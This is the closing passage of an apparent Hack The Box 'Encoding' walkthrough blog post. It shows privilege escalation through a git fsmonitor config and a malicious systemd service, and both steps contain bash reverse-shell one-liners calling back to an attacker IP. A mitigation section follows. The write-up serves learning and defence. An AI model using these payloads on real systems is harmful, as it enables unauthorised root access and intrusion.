        /usr/bin/git <span class="nt">--git-dir</span><span class="o">=</span>/var/www/image/.git  <span class="nt">--work-tree</span><span class="o">=</span>/var/www/image add <span class="nt">-A</span>
<span class="k">else</span>
        /usr/bin/git <span class="nt">--git-dir</span><span class="o">=</span>/var/www/image/.git  <span class="nt">--work-tree</span><span class="o">=</span>/var/www/image commit <span class="nt">-m</span> <span class="s2">"Commited from API!"</span> <span class="nt">--author</span><span class="o">=</span><span class="s2">"james &lt;james@haxtables.htb&gt;"</span>  <span class="nt">--no-verify</span>
<span class="k">fi</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The script checks if there are any new files in the repository. If there are any, they are added to the index. If there are none, the code commits any changes, without running pre-commit hooks.</p>

<p>I also saw a .gitconfig file in â€˜/var/www/â€™.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>www-data@encoding:~/image<span class="nv">$ </span><span class="nb">cat</span> /var/www/.gitconfig
<span class="o">[</span>safe]
        directory <span class="o">=</span> /var/www/image
</pre></td></tr></tbody></table></code></div></div>

<p>The <a href="https://git-scm.com/docs/git-config#Documentation/git-config.txt-safedirectory">safe directory</a> configuration allows using git configuration and hooks in the repository, even if they are not owned by the user running the command. That meant I could create a configuration that would be used when I ran the command as svc.</p>

<p>I looked at the permissions on the git configuration. Only svc was able to write to the file</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>svc@encoding:/var/www/image<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /var/www/image/
total 36
drwxr-xr-x  7 svc  svc  4096 Mar  7 01:54 <span class="nb">.</span>
drwxr-xr-x  5 root root 4096 Mar  7 01:54 ..
drwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 actions
drwxr-xr-x  3 svc  svc  4096 Mar  7 01:54 assets
drwxrwxr-x+ 8 svc  svc  4096 Mar  7 01:54 .git
drwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 includes
<span class="nt">-rw-r--r--</span>  1 svc  svc    81 Mar  7 01:54 index.php
drwxr-xr-x  2 svc  svc  4096 Mar  7 01:54 scripts
<span class="nt">-rw-r--r--</span>  1 svc  svc  1250 Mar  7 01:54 utils.php

svc@encoding:/var/www/image<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /var/www/image/.git/
total 52
drwxrwxr-x+  8 svc svc 4096 Mar  7 01:54 <span class="nb">.</span>
drwxr-xr-x   7 svc svc 4096 Mar  7 01:54 ..
drwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 branches
<span class="nt">-rw-rwxr--</span>+  1 svc svc   17 Mar  7 01:54 COMMIT_EDITMSG
<span class="nt">-rw-r--r--</span>+  1 svc svc   92 Mar  7 01:54 config
<span class="nt">-rw-rwxr--</span>+  1 svc svc   73 Mar  7 01:54 description
<span class="nt">-rw-rwxr--</span>+  1 svc svc   23 Mar  7 01:54 HEAD
drwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 hooks
<span class="nt">-rw-rwxr--</span>+  1 svc svc  821 Mar  7 01:54 index
drwxrwxr-x+  2 svc svc 4096 Mar  7 01:54 info
drwxrwxr-x+  3 svc svc 4096 Mar  7 01:54 logs
drwxrwxr-x+ 22 svc svc 4096 Mar  7 01:54 objects
drwxrwxr-x+  4 svc svc 4096 Mar  7 01:54 refs
</pre></td></tr></tbody></table></code></div></div>

<p>But there was a <a href="https://serverfault.com/questions/227852/what-does-a-mean-at-the-end-of-the-permissions-from-ls-l">+ sign</a> at the end of the file permissions. I had never seen that before. It meant there were <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/ch-acls">additional permissions</a> on the files.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre>svc@encoding:/var/www/image<span class="nv">$ </span>getfacl .git
<span class="c"># file: .git</span>
<span class="c"># owner: svc</span>
<span class="c"># group: svc</span>
user::rwx
user:www-data:rwx
group::r-x
mask::rwx
other::r-x

svc@encoding:/var/www/image<span class="nv">$ </span>getfacl .git/config
<span class="c"># file: .git/config</span>
<span class="c"># owner: svc</span>
<span class="c"># group: svc</span>
user::rw-
user:www-data:r--
group::r--
mask::r--
other::r--
</pre></td></tr></tbody></table></code></div></div>

<p>With those permissions, www-data could write in .git. So I could overwrite the config file.</p>

<p>I added a command to run as the <a href="https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md#poc---executing-arbitrary-commands-via-corefsmonitor">file system monitor</a> in the existing â€˜.git/configâ€™ file and ran the script.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>www-data@encoding:/tmp<span class="nv">$ </span><span class="nb">cat</span> /var/www/image/.git/config
<span class="o">[</span>core]
        repositoryformatversion <span class="o">=</span> 0
        filemode <span class="o">=</span> <span class="nb">true
        </span>bare <span class="o">=</span> <span class="nb">false
        </span>logallrefupdates <span class="o">=</span> <span class="nb">true
        </span>fsmonitor <span class="o">=</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4445 0&gt;&amp;1'"</span>

www-data@encoding:/tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> svc /var/www/image/scripts/git-commit.sh
</pre></td></tr></tbody></table></code></div></div>

<p>I got a reverse shell as svc.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 4445
listening on <span class="o">[</span>any] 4445 ...
connect to <span class="o">[</span>10.10.14.8] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.198] 57242
svc@encoding:/var/www/image<span class="err">$</span>

svc@encoding:/var/www/image<span class="nv">$ </span><span class="nb">cd
cd

</span>svc@encoding:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 40
drwxr-x--- 5 svc  svc  4096 Jan 23 18:23 <span class="nb">.</span>
drwxr-xr-x 3 root root 4096 Jan 13 16:25 ..
lrwxrwxrwx 1 svc  svc     9 Nov 11 14:31 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span> 1 svc  svc   220 Jan  6  2022 .bash_logout
<span class="nt">-rw-r--r--</span> 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 3 svc  svc  4096 Jan 13 16:25 .cache
<span class="nt">-rw-rw-r--</span> 1 svc  svc    85 Nov  8 16:37 .gitconfig
drwx------ 3 svc  svc  4096 Jan 13 16:25 .gnupg
<span class="nt">-rw-r--r--</span> 1 svc  svc   807 Jan  6  2022 .profile
drwx------ 2 svc  svc  4096 Jan 13 16:25 .ssh
<span class="nt">-rw-r-----</span> 1 root svc    33 Mar  5 12:05 user.txt

svc@encoding:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
REDACTED
</pre></td></tr></tbody></table></code></div></div>

<h2 id="systemd-exploit"><span class="mr-2">Systemd Exploit</span><a href="#systemd-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>The svc user had a private ssh key in their home folder. I downloaded it to my machine and used it to reconnect. Then I looked for anything I could run with sudo.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>svc@encoding:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>svc on encoding:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User svc may run the following commands on encoding:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/systemctl restart <span class="k">*</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I could restart a service with <code class="language-plaintext highlighter-rouge">systemctl</code>. I found <a href="https://chaudhary1337.github.io/p/how-to-systemctl-misconfiguration-exploit/">a technique</a> that created a new service by adding a file in â€˜/etc/systemd/system/â€™.</p>

<p>Just as with the git repository, the normal file permissions did not allow me to write to the folder. But the ACL did.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>svc@encoding:/var/www/image<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-ld</span> /etc/systemd/system/
drwxrwxr-x+ 22 root root 4096 Mar 10 00:36 /etc/systemd/system/

svc@encoding:/var/www/image<span class="nv">$ </span>getfacl /etc/systemd/system/
getfacl: Removing leading <span class="s1">'/'</span> from absolute path names
<span class="c"># file: etc/systemd/system/</span>
<span class="c"># owner: root</span>
<span class="c"># group: root</span>
user::rwx
user:svc:-wx
group::rwx
mask::rwx
other::r-x
</pre></td></tr></tbody></table></code></div></div>

<p>I created a new service to open a reverse shell to my machine.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>svc@encoding:~<span class="nv">$ </span><span class="nb">cat </span>root.service
<span class="o">[</span>Unit]
<span class="nv">Description</span><span class="o">=</span>pwn

<span class="o">[</span>Service]
<span class="nv">Type</span><span class="o">=</span>simple
<span class="nv">User</span><span class="o">=</span>root
<span class="nv">ExecStart</span><span class="o">=</span>/bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.14.8/4444 0&gt;&amp;1'</span>

svc@encoding:~<span class="nv">$ </span><span class="nb">cp </span>root.service /etc/systemd/system/

<span class="nb">sudo </span>systemctl restart root.service
</pre></td></tr></tbody></table></code></div></div>

<p>When the service restarted, I got the shell in my listener.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-klvnp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.8] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.198] 42394
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>5229<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell

root@encoding:/# <span class="nb">cat</span> /root/root.txt
<span class="nb">cat</span> /root/root.txt
REDACTED
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>There were 2 LFI vulnerabilities in this box. The first one had some validations, but it should have made sure that the scheme was http or https. The URL should also be validated with <code class="language-plaintext highlighter-rouge">filter_var</code>. This would have rejected the URL with the UTF-8.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nv">$url</span> <span class="o">=</span> <span class="s1">'http://haxtabâ“›â“”s.htb/test'</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'Original: '</span> <span class="mf">.</span> <span class="nv">$url</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="k">echo</span> <span class="s1">'Filtered: '</span> <span class="mf">.</span> <span class="nb">filter_var</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_URL</span><span class="p">)</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>php test.php
Original: http://haxtabâ“›â“”s.htb/test
Filtered: 
</pre></td></tr></tbody></table></code></div></div>

<p>The second LFI was caused by an include of the <code class="language-plaintext highlighter-rouge">page</code> passed by the user. This is looking for trouble. There should have been some validation around the page passed in. If the goal was to show a page of the application, the code should have kept an allowed list of pages and made sure the page was valid.</p>

<p>Another issue was with the permissions in the git repository. The safe directory setting allowed running code as another user. Without it, my fsmonitor configuration would have been ignored. And the ACL allowed me to write to a file that should have been protected.</p>

<p>The last issue with the permissions to restart any service in systemd. That should have allowed me to only restart the existing services. But since I was able to write in â€˜/etc/systemd/system/â€™, I was able to create a new service to restart and execute my code.</p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/walkthrough/"
          class="post-tag no-text-decoration" >Walkthrough</a>
      
      <a href="/tags/hacking/"
          class="post-tag no-text-decoration" >Hacking</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >HackTheBox</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >Medium</a>
      
      <a href="/tags/machine/"
          class="post-tag no-text-decoration" >Machine</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+Encoding+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2F2023%2F04%2FHTB%2FEncoding" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+Encoding+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2F2023%2F04%2FHTB%2FEncoding" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2F2023%2F04%2FHTB%2FEncoding&text=Hack+The+Box+-+Encoding+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Health/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673020800"
    data-df="ll"
    >
  Jan  7, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Health</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.

It started with using a web application...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/2023/01/HTB/UpDown">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674230400"
    data-df="ll"
    >
  Jan 21, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - UpDown</h3>
            <div class="text-muted small">
              <p>
                





                It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.


  Room: UpDown
  Difficulty: Medium
  URL: https://app.hackthebox.com/machine...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Ambassador/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674835200"
    data-df="ll"
    >
  Jan 28, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Ambassador</h3>
            <div class="text-muted small">
              <p>
                





                This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/HackTheBox-Walkthrough-BroScience/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Hack The Box - BroScience</p>
  </a>
  

  
  <a href="/posts/HackTheBox-Walkthrough-Investigation/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Hack The Box - Investigation</p>
  </a>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    <!-- The Footer -->

<footer>
  <div class="container pl-lg-4 pr-lg-4">
    <div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
      <div class="footer-left">
        <p class="mb-0">
          Â© 2023
          <a href="https://twitter.com/AnkitKanojiya69">Ankit Kanojiya</a>.
          
          <span data-toggle="tooltip" data-placement="top"
            title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
          
        </p>
      </div>

      <div class="footer-right">
        <p class="mb-0">

          

          

          Powered by 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
           with 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
           theme.
        </p>
      </div>
    </div>
  </div>
